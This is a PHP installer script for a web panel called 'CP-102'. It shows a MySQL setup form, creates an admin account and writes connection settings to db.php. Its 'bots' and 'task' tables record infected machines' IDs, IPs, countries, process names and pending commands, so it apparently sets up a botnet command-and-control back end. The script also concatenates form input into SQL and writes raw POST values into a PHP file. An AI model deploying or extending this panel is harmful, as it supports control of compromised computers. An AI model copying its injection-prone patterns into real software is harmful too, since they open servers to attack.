<?php
$variable = <<<Bdy
<!doctype html>
<html lang="en"><head>
    <meta charset="utf-8">
    <title>Setup</title>
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">

    <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" type="text/css" href="lib/bootstrap/css/bootstrap.css">
    <link rel="stylesheet" href="lib/font-awesome/css/font-awesome.css">

    <script src="lib/jquery-1.11.1.min.js" type="text/javascript"></script>    

    <link rel="stylesheet" type="text/css" href="stylesheets/theme.css">
    <link rel="stylesheet" type="text/css" href="stylesheets/premium.css">

</head>
<body class=" theme-blue">

    <!-- Demo page code -->

    <script type="text/javascript">
        $(function() {
            var match = document.cookie.match(new RegExp('color=([^;]+)'));
            if(match) var color = match[1];
            if(color) {
                $('body').removeClass(function (index, css) {
                    return (css.match (/\btheme-\S+/g) || []).join(' ')
                })
                $('body').addClass('theme-' + color);
            }

            $('[data-popover="true"]').popover({html: true});
            
        });
    </script>
    <style type="text/css">
        #line-chart {
            height:300px;
            width:800px;
            margin: 0px auto;
            margin-top: 1em;
        }
        .navbar-default .navbar-brand, .navbar-default .navbar-brand:hover { 
            color: #fff;
        }
    </style>

    <script type="text/javascript">
        $(function() {
            var uls = $('.sidebar-nav > ul > *').clone();
            uls.addClass('visible-xs');
            $('#main-menu').append(uls.clone());
        });
    </script>

    <!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <!-- Le fav and touch icons -->
    <link rel="shortcut icon" href="../assets/ico/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../assets/ico/apple-touch-icon-144-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="../assets/ico/apple-touch-icon-114-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="../assets/ico/apple-touch-icon-72-precomposed.png">
    <link rel="apple-touch-icon-precomposed" href="../assets/ico/apple-touch-icon-57-precomposed.png">
  

  <!--[if lt IE 7 ]> <body class="ie ie6"> <![endif]-->
  <!--[if IE 7 ]> <body class="ie ie7 "> <![endif]-->
  <!--[if IE 8 ]> <body class="ie ie8 "> <![endif]-->
  <!--[if IE 9 ]> <body class="ie ie9 "> <![endif]-->
  <!--[if (gt IE 9)|!(IE)]><!--> 
   
  <!--<![endif]-->

    <div class="navbar navbar-default" role="navigation">
        <div class="navbar-header">
          <a class="" href="index.html"><span class="navbar-brand"> CP-102</span></a></div>

        <div class="navbar-collapse collapse" style="height: 1px;">

        </div>
      </div>
    </div>
	
<form method="post" id="install" action="setup.php">
 <div class="dialog">
    <div class="panel panel-default">
        <p class="panel-heading no-collapse">Setup</p>
        <div class="panel-body">
				<h3>MySQL Server</h3><hr>
				
                <div class="form-group">
                    <label>Host</label>
                    <input name="host" value="127.0.0.1" type="text" class="form-control span12">
                </div>
                <div class="form-group">
                    <label>User</label>
                    <input type="text" name="user" value="root" class="form-control span12">
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="pass" value="" class="form-control span12">
                </div>
				<div class="form-group">
                    <label>Database</label>
                    <input type="text" name="db" value="cp102" class="form-control span12">
                </div>
				<br>
				<h3>User Root</h3><hr>

						<div class="form-group">
							<label>User name</label>
							<input type="text" name="username" value="root" class="form-control span12">
						</div>
						<div class="form-group">
							<label>Pass</label>
							<input type="password" name="password" value="toor" class="form-control span12">
						</div>
				<br>
                <div class="form-group">
                    <input type="submit" class="btn btn-primary pull-right" value="-- Install --"/>
            
            
                </div>
                    <div class="clearfix"></div>
           
				</div>
			</div>
		</div>
 </form>


    <script src="lib/bootstrap/js/bootstrap.js"></script>
    <script type="text/javascript">
        $("[rel=tooltip]").tooltip();
        $(function() {
            $('.demo-cancel-click').click(function(){return false;});
        });
    </script>
    
  
</body></html>
Bdy;
$variable2 = <<<Bdy1

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
  <title>Setup</title>
  <meta http-equiv="Content-Style-Type" content="text/css" />
  <meta http-equiv="Content-Script-Type" content="text/javascript" />
  <link rel="stylesheet" href="./css/style.css" type="text/css" />
</head>

<body>
<form action="index.php">
    <table class="table_frame" style="width:350px">
        <tr>
            <td colspan="2" class="td_header" align="left">Settings already confirmed.</td>
        </tr>
      
            <td colspan="2" valign="top"><table class="table_frame" width="100%">
           
              <td align="left" style="white-space:normal">Settings are already set. In order to reset your configuration you need
              to delete the database and the file "db.php", keep in mind that doing this you'll loose all your stored connections.</td>
        
    </table>
</form>
</body>

</html>
Bdy1;

$filename = 'db.php'; 
 
if (file_exists($filename)) { 
    echo $variable2; 
} else { 
    echo $variable; 
} 

$between = '
 <div class="dialog" style="margin-top:15px">
    <div class="panel panel-default">
        <p class="panel-heading no-collapse">Installation Steps</p>
        <div class="panel-body">
';

if($_POST && isset($_POST['host'],$_POST['user'],$_POST['pass'],$_POST['db'],$_POST['username'],$_POST['password']))
{

    //connection variables
    $host = $_POST['host'];
    $user = $_POST['user'];
    $password = $_POST['pass'];
    $database = $_POST['db'];


    //create mysql connection
    mysqli_report(MYSQLI_REPORT_STRICT);
    try {
        $mysqli = new mysqli($host,$user,$password);
        $between.=  '<p class="success">&#8226; Connection with MYSQL created.</p>';

    } catch (Exception $e ) {
        echo '<br><table xmlns="http://www.w3.org/1999/xhtml" class="table_frame" style="width:350px"><tr><td colspan="1" class="td_header" align="left">Installation steps:</td></tr><tr><td class="error" align="left">&#8226; ERROR:'. $e->getMessage(),'.</td></tr></table>';
        //printf("Connection failed: %s\n", $mysqli->connect_error);
        die();
    }

    if ($mysqli->connect_errno) {
        echo '<br><table xmlns="http://www.w3.org/1999/xhtml" class="table_frame" style="width:350px"><tr><td colspan="1" class="td_header" align="left">Installation steps:</td></tr><tr><td class="error" align="left">&#8226; ERROR:Connection to the database.</td></tr></table>';
        die();
    }

    //create the database
    if ( !$mysqli->query('CREATE DATABASE '.$database) ) {
        echo '<br><table xmlns="http://www.w3.org/1999/xhtml" class="table_frame" style="width:350px"><tr><td colspan="1" class="td_header" align="left">Installation steps:</td></tr><tr><td class="error" align="left">&#8226; ERROR:'. $mysqli->error,'.</td></tr></table>';
        die();
    }else{
        $between.= '<p class="success">&#8226; Database '. trim($database).' successfully created!</p>';
    }

    //create users table with all the fields
    try{
            $conn = mysqli_connect($host, $user, $password, $database);
            if (!$conn) {
                echo '<table xmlns="http://www.w3.org/1999/xhtml" class="table_frame" style="width:350px"><tr><td colspan="1" class="td_header" align="left">Installation steps:</td></tr><tr><td class="error" align="left">&#8226; ERROR:Connection to the database.</td></tr></table>';
            }

            
            // Get Post Vars To Insert
            $usernameR = $mysqli->escape_string($_POST['username']);
            $passwordR = $mysqli->escape_string(password_hash($_POST['password'], PASSWORD_BCRYPT));
            $hash = $mysqli->escape_string( md5( rand(0,1000) ) );
            $between.=  '<p class="success">&#8226; Initialized credentials successfully.</p>';

            // Create Table accounts
            $sql = '
            CREATE TABLE IF NOT EXISTS accounts 
            (
                id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
                user VARCHAR(100) NOT NULL,
                password VARCHAR(100) NOT NULL,
                hash VARCHAR(100) NOT NULL,
                active BOOL NOT NULL DEFAULT 0,
                lastactivity VARCHAR(100) NOT NULL,
                role VARCHAR(100) NOT NULL,
                showbots VARCHAR(10) NOT NULL
            );';
            //Create Table bots
            $sql11 = '
            CREATE TABLE IF NOT EXISTS bots
            (   id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
                bot_id VARCHAR(100) NOT NULL,
                bot_version VARCHAR(100) NOT NULL,
				username VARCHAR(255) NOT NULL,
                os_version VARCHAR(100) NOT NULL,
                process_name VARCHAR(100) NOT NULL,
                ipv4 VARCHAR(100) NOT NULL,
                country VARCHAR(100) NOT NULL,
                last_activity VARCHAR(100) NOT NULL,
                cmd VARCHAR(100) NULL,
                installdate VARCHAR(100) NOT NULL,
                computername VARCHAR(255) NOT NULL,
                installationpath VARCHAR(1000) NOT NULL

            );';
            //Task Table
            $sql12 = '
            CREATE TABLE IF NOT EXISTS task
            (   id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
                Creator VARCHAR(100) NOT NULL,
                Task VARCHAR(100) NOT NULL,
                Parameters VARCHAR(100) NOT NULL,
                Executions VARCHAR(100) NOT NULL,
                Data_Created VARCHAR(100) NOT NULL,
                Status VARCHAR(100) NOT NULL,
                Executedon INT
            );';
                        
            //Log Table
            $sql13 = '
            CREATE TABLE IF NOT EXISTS logs
            (   id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
                username VARCHAR(100) NOT NULL,
                ipaddress VARCHAR(100) NOT NULL,
                action VARCHAR(255) NOT NULL,
                date VARCHAR(100) NOT NULL
            );';
            // Creating bots
            if (mysqli_query($conn, $sql11)) {
                $between.=  '<p class="success">&#8226; Table "bots" successfully created.</p>';
            }else {
                echo '<br><table xmlns="http://www.w3.org/1999/xhtml" class="table_frame" style="width:350px"><tr><td colspan="1" class="td_header" align="left">Installation steps:</td></tr><tr><td class="error" align="left">&#8226; ERROR:'. mysqli_error($conn),'</td></tr></table>';
                die();
            }
            
            // Creating Task
            if (mysqli_query($conn, $sql12)) {
                $between.=  '<p class="success">&#8226; Table "task" successfully created.</p>';
            }else {
                echo '<br><table xmlns="http://www.w3.org/1999/xhtml" class="table_frame" style="width:350px"><tr><td colspan="1" class="td_header" align="left">Installation steps:</td></tr><tr><td class="error" align="left">&#8226; ERROR:'. mysqli_error($conn),'</td></tr></table>';
                die();
            }
            // Creating Logs
            if (mysqli_query($conn, $sql13)) {
                $between.=  '<p class="success">&#8226; Table "logs" successfully created.</p>';
            }else {
                echo '<br><table xmlns="http://www.w3.org/1999/xhtml" class="table_frame" style="width:350px"><tr><td colspan="1" class="td_header" align="left">Installation steps:</td></tr><tr><td class="error" align="left">&#8226; ERROR:'. mysqli_error($conn),'</td></tr></table>';
                die();
            }

            //Execute Query Create accounts Table - Finishes Here-
            if (mysqli_query($conn, $sql)) {
                $between.=  '<p class="success">&#8226; Table "accounts" successfully created.</p>';
                try{
                    $result = $mysqli->query("SELECT * FROM accounts WHERE user='$usernameR'");
                    $rowsget = 0;
                    if($result){
                        $rowsget = $result->num_rows;
                    }
                    if ( $rowsget > 0 ) {
                        echo '<br><table xmlns="http://www.w3.org/1999/xhtml" class="table_frame" style="width:350px"><tr><td colspan="1" class="td_header" align="left">Installation steps:</td></tr><tr><td class="error" align="left">&#8226; ERROR:User already exists!</td></tr></table>';
                        die();
                    }else{
                        $sql = "INSERT INTO accounts (user, password, hash, role, showbots) VALUES ('$usernameR','$passwordR','$hash','Admin', 'True')";
                        if (mysqli_query($conn, $sql)) {
                            $between.=  '<p class="success">&#8226; User "'. trim($usernameR).'" successfully created.</p>';
							
							$now = date("Y-m-d H:i:s");
							$sql = "UPDATE accounts SET lastactivity='$now' WHERE user='$usernameR'";

							if ($conn->query($sql) === TRUE) {
							} else {
								echo "Error updating record: " . $conn->error;
								die();
							}

				
                        } else {
                            echo "Error occurred: " . mysqli_error($conn);
                        }

                            $_SESSION['active'] =1; //0 until user activates their account with verify.php
                            $_SESSION['logged_in'] = true; // So we know the user has logged in
                            $between.=  '<p class="success">&#8226; All done!<br><br><br><b>-- Installation complete! --</b></p>';
							
                            echo $between;

                    }
                }
                catch (Exception $e){
                    echo '<br><table xmlns="http://www.w3.org/1999/xhtml" class="table_frame" style="width:350px"><tr><td colspan="1" class="td_header" align="left">Installation steps:</td></tr><tr><td class="error" align="left">&#8226; ERROR:'. mysqli_error($conn),'</td></tr></table>';
                    die();
                }
                
				
				
                mysqli_close($conn);
            }else {
                echo '<br><table xmlns="http://www.w3.org/1999/xhtml" class="table_frame" style="width:350px"><tr><td colspan="1" class="td_header" align="left">Installation steps:</td></tr><tr><td class="error" align="left">&#8226; ERROR:'. mysqli_error($conn),'</td></tr></table>';
                die();
            }
            
            // Write db.php file
            $myfile = fopen("db.php", "w") or die("Unable to open 'db.php' file!");
            fwrite($myfile,'<?php
/* Database connection settings */'."\n");
            fwrite($myfile,'$host = '."'".$host."';\n");
            fwrite($myfile,'$user = '."'".$user."';\n");
            fwrite($myfile,'$pass = '."'".$password."';\n");
            fwrite($myfile,'$db   = '."'".$database."';\n");

            fwrite($myfile,'$mysqli = new mysqli($host,$user,$pass,$db) or die($mysqli->error);');
            fwrite($myfile,"\n?>");
            fclose($myfile);
            

            
        }catch (Exception $e){
            echo '<br><table xmlns="http://www.w3.org/1999/xhtml" class="table_frame" style="width:350px"><tr><td colspan="1" class="td_header" align="left">Installation steps:</td></tr><tr><td class="error" align="left">&#8226; ERROR:'. $e->getMessage(),'.</td></tr></table>';
            die();
        }
}
    

?>